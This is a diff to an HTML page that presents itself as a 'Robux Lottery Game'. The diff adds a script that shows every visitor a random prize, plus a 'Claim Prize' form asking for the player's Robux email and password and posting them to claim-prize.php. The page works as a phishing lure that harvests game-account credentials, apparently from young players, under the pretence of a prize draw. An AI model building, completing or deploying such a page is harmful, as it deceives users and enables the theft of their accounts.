@@ -80,121 +80,30 @@
         height: auto;
         display: block;
     }
-</style>
-</head>
-<body>
-<audio autoplay loop>
-    <source src="background-music.mp3" type="audio/mpeg">
-    Your browser does not support the audio element.
-</audio>
 
-<header>
-    <h1>Welcome to the Robux Lottery Game!</h1>
-    <p>Participate now for a chance to win Robux!</p>
-</header>
-
-<div class="container">
-    <p>This is your chance to win Robux in our exciting lottery game. Simply click the button below to join the game!</p>
-    <a href="lottery.html" class="button">Join Now</a>
-</div>
-
-<div id="gallery" class="container">
-    <div class="gallery-item">
-        <img src="image1.jpg" alt="Image 1">
-    </div>
-    <div class="gallery-item">
-        <img src="image2.jpg" alt="Image 2">
-    </div>
-    <div class="gallery-item">
-        <img src="image3.jpg" alt="Image 3">
-    </div>
-    <!-- Add more gallery items as needed -->
-</div>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Robux Lottery Game</title>
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        font-family: Arial, sans-serif;
-        background-image: url('background.jpg'); /* Adjust the path to your background image */
-        background-size: cover;
-        background-position: center;
-        color: #fff;
+    #lottery-form {
+        display: none;
     }
 
-    header {
-        background-color: rgba(0, 0, 0, 0.7);
-        padding: 20px;
-        text-align: center;
-    }
-
-    h1 {
-        margin: 0;
-        font-size: 36px;
-        color: #fff;
-        text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-    }
-
-    p {
-        font-size: 18px;
-        margin-top: 10px;
-        color: #fff;
-    }
-
-    .container {
-        max-width: 800px;
-        margin: 20px auto;
-        padding: 20px;
-        background-color: rgba(255, 255, 255, 0.9);
-        border-radius: 10px;
-        box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
-    }
-
-    .button {
-        display: inline-block;
-        padding: 15px 30px;
-        margin-top: 20px;
-        background-color: #007bff;
-        color: #fff;
-        text-decoration: none;
-        border-radius: 5px;
-        transition: background-color 0.3s ease;
-        font-size: 20px;
-        border: none;
-        cursor: pointer;
-    }
-
-    .button:hover {
-        background-color: #0056b3;
-    }
-
-    #gallery {
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: center;
-        margin-top: 20px;
-    }
-
-    .gallery-item {
-        margin: 10px;
-        border-radius: 5px;
-        overflow: hidden;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-    }
-
-    .gallery-item img {
-        width: 100%;
-        height: auto;
+    #lottery-form.show {
         display: block;
     }
+
+    label {
+        display: block;
+        margin-top: 10px;
+        font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
 </style>
 </head>
 <body>
@@ -210,8 +119,18 @@
 
 <div class="container">
     <p>This is your chance to win Robux in our exciting lottery game. Simply click the button below to join the game!</p>
-    <a href="lottery.html" class="button">Join Now</a>
+    <button onclick="playLottery()" class="button">Join Now</button>
 </div>
+
+<form id="lottery-form" class="container" action="claim-prize.php" method="post">
+    <h2>Congratulations!</h2>
+    <p>You won <span id="prize"></span> Robux!</p>
+    <label for="email">Robux Email:</label>
+    <input type="text" id="email" name="email" required>
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password" required>
+    <input type="submit" value="Claim Prize" class="button">
+</form>
 
 <div id="gallery" class="container">
     <div class="gallery-item">
@@ -225,6 +144,15 @@
     </div>
     <!-- Add more gallery items as needed -->
 </div>
+
+<script>
+    function playLottery() {
+        var randomNumber = Math.floor(Math.random() * 11); // Generate a random number between 0 and 10
+        var prize = randomNumber * 100; // Multiply the random number by 100 to get the prize in Robux
+        document.getElementById('prize').innerText = prize;
+        document.getElementById('lottery-form').classList.add('show');
+    }
+</script>
 
 </body>
 </html>
